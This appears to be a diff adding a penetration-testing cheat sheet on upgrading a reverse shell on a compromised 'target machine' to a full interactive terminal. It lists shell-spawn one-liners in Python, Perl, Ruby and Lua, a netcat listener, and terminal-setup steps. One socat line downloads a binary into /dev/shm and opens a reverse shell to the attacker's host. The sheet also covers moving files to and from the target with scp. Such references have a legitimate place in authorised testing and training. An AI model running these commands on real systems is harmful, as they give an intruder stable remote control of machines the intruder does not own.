@@ -1,0 +1,126 @@
+###################
+#     Step 1      #
+###################
+# Find out which python version is installed:
+```bash 
+	which python python2 python3
+```
+# Note: The which command will only report programs that are installed in a folder that exists in $PATH. Python will almost always be in a $PATH directory so this should not be an issue.
+
+###################
+#     Step 2      #
+###################
+# Type in the target machine command line
+```python(2-3)
+	python -c 'import pty; pty.spawn("/bin/bash")'
+```
+# Note if python is not installed or you dont have access run this command instead
+```bash
+	script -qc /bin/bash /dev/null
+```
+# NOTE: More available commands besides python and script are in the 'Other' section below
+# Your command prompt may or may not change to reflect the new shell. If it does not change, do not panic as this is configured locally and will depend on setting on the machine you are on.
+Press [CTRL+z] to background the process
+
+####################
+#     Step 3       #
+####################
+# After backgrounding the remote host command line and back on your own machine command line type the next 2 lines
+```bash
+	stty raw -echo
+	stty size 
+```
+###################
+#     Step 4      #
+###################
+# Once you have typed the 2 lines above retrun to the remote machine by bring the remote machine from the background to the forground
+```bash
+	fg
+```
+###################
+#     Step 5      #
+###################
+# Finally isn the remote machine type the following lines
+```bash
+	export SHELL=bash
+```
+#Set remote shell to x number of rows & y columns
+```bash
+	stty rows $x columns $y 
+	export TERM=xterm-256color 
+```
+##################
+#    Other 1     #
+##################
+# If Python is not your thang there are other ways just replace the Python command in step 2 with one of these below
+# system
+```bash
+	echo os.system("/bin/bash")
+	/bin/sh -i
+```
+# perl
+```perl
+	perl —e 'exec "/bin/sh";'
+```
+#ruby
+```ruby
+	exec "/bin/sh"
+	ruby -e 'exec "/bin/sh"'
+```
+
+#lua
+```lua
+	lua -e "os.execute('/bin/sh')"
+```
+##################
+#    Other 2     #
+##################
+
+# NOTE: if you have rlwrap installed then easily upgrade your shell when starting the netcat listener
+```bash
+	rlwrap nc -lvnp $port
+```
+##################
+#    Other 3     #
+##################
+
+# NOTE: If the target machine has the Expect scripting language installed then easily create a script on the remote host to gain a upgraded shell
+# Step 1. Create a script called 'sh.exp'
+# Step 2. type the 3 lines below in the sh.exp script
+```
+	#!/usr/bin/expect
+	spawn sh
+	interact
+```
+# Step 3. Save and Exit editor
+# Step 4. make executable if needed
+```bash
+	chmod 777 sh.exp
+```
+# Step 5. Run script
+```
+	./sh.exp
+```
+##################
+#    Other 4     #
+##################
+
+# Socat
+# If your host machine has socat installed then just run this 1 liner on the target machine changing the IP and PORT to your host machine
+```
+	wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT
+```
+##################
+# File Transfer  #
+##################
+
+# UPLOAD TO REMOTE
+```
+	scp FileName username@IP-Address:~/destination -P PORT
+```
+
+# DOWNLOAD FROM REMOTE
+```
+	scp user@IP-Address:~/path_to_file file_saved -P PORT
+```
+
